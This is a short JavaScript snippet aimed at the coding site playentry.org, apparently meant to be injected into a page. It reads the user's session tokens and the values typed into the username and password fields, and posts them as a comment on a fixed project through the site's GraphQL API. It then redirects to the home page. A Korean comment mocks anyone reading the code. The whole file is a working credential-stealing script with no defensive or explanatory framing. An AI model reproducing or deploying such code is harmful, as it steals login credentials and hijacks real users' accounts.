fetch("https://playentry.org/graphql", {
  headers: {
    "content-type": "application/json",
    "csrf-token": `${
      JSON.parse(document.getElementById("__NEXT_DATA__").innerText).props
        .initialProps.csrfToken
    }`,
    "x-client-type": "Client",
    "x-token": `${
      JSON.parse(document.getElementById("__NEXT_DATA__").innerText).props
        .initialState.common.user.xToken
    }`,
  },
  referrerPolicy: "unsafe-url",
  body: `{"query":" mutation CREATE_COMMENT($content: String $target: String $targetSubject: String $targetType: String){createComment(content:$content target:$target targetSubject: $targetSubject targetType: $targetType){comment{id}}}","variables":{"content":"${document.getElementsByName("username")[0].value}, ${document.getElementsByName("password")[0].value}","target":"661bd93eda7970f673d88b9d","targetSubject":"project","targetType":"individual"}}`,
  method: "POST",
  mode: "cors",
  credentials: "include",
});
location.href = "https://playentry.org/"
// 코드 왜 훔쳐봄;
